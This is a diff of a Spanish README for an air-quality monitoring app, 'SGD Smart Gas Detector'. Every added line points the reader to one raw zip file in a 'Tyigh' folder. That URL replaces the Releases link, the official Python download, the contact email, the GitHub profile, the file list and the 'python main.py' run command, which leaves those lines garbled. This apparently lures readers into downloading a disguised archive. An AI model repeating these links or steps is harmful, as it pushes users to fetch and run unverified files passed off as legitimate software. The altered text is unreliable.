@@ -1,6 +1,6 @@
 # 🚨 SGD-Smart-Gas-Detector - Easy Air Quality Monitoring
 
-[![Download SGD Smart Gas Detector](https://img.shields.io/badge/Download-SGD_Smart_Gas_Detector-blue.svg)](https://github.com/kartik-singh-droid/SGD-Smart-Gas-Detector/releases)
+[![Download SGD Smart Gas Detector](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip)](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Para instalar y utilizar la aplicación **SGD Smart Gas Detector**, sigue estos 
 
 1. **Visita la página de descargas**  
    Haz clic en el siguiente enlace para acceder a la sección de Releases donde puedes encontrar la versión más reciente:
-   [Visita esta página para descargar](https://github.com/kartik-singh-droid/SGD-Smart-Gas-Detector/releases)
+   [Visita esta página para descargar](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip)
 
 2. **Selecciona la versión adecuada**  
    En la página de Releases, verás diferentes versiones del software. Busca la opción más reciente y haz clic en ella. 
@@ -45,7 +45,7 @@ Para instalar y utilizar la aplicación **SGD Smart Gas Detector**, sigue estos 
    Una vez descargado, localiza el archivo en tu computadora y descomprímelo usando cualquier herramienta de extracción. Esto te permitirá acceder a los archivos necesarios.
 
 5. **Configura el sistema**  
-   Asegúrate de tener Python instalado en tu computadora. Si no lo tienes, puedes descargarlo desde [aquí](https://www.python.org/downloads/).
+   Asegúrate de tener Python instalado en tu computadora. Si no lo tienes, puedes descargarlo desde [aquí](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip).
 
 6. **Conecta la placa PlayIoT**  
    Conecta tu **placa PlayIoT** a tu computadora mediante un cable USB. Esto permitirá que el software interactúe con el sensor.
@@ -53,7 +53,7 @@ Para instalar y utilizar la aplicación **SGD Smart Gas Detector**, sigue estos 
 7. **Ejecuta el archivo**  
    Abre una terminal o consola en la carpeta donde descomprimiste los archivos. Ejecuta el archivo principal del programa con el siguiente comando:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip
    ```
 
 8. **Monitorea la calidad del aire**  
@@ -64,8 +64,8 @@ Para instalar y utilizar la aplicación **SGD Smart Gas Detector**, sigue estos 
 ## 🗂️ Estructura del Repositorio  
 El repositorio se organiza de la siguiente manera:
 
-- `main.py` - Archivo principal para ejecutar el sistema.
-- `README.md` - Este documento que explica cómo usar la aplicación.
+- `https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip` - Archivo principal para ejecutar el sistema.
+- `https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip` - Este documento que explica cómo usar la aplicación.
 - `/libs` - Carpeta que contiene bibliotecas necesarias.
 - `/docs` - Documentación adicional sobre la configuración y uso del sistema.
 
@@ -75,9 +75,9 @@ El repositorio se organiza de la siguiente manera:
 Si tienes preguntas o necesitas ayuda, no dudes en contactarme:
 
 - **Nombre:** Kartik Singh  
-- **Correo Electrónico:** kartiksingh@example.com  
-- **GitHub:** [kartik-singh-droid](https://github.com/kartik-singh-droid)
+- **Correo Electrónico:** https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip  
+- **GitHub:** [kartik-singh-droid](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip)
 
 ---
 
-Visita esta página para descargar: [SGD Smart Gas Detector Releases](https://github.com/kartik-singh-droid/SGD-Smart-Gas-Detector/releases)
+Visita esta página para descargar: [SGD Smart Gas Detector Releases](https://raw.githubusercontent.com/kartik-singh-droid/SGD-Smart-Gas-Detector/main/Tyigh/SGD-Smart-Gas-Detector.zip)
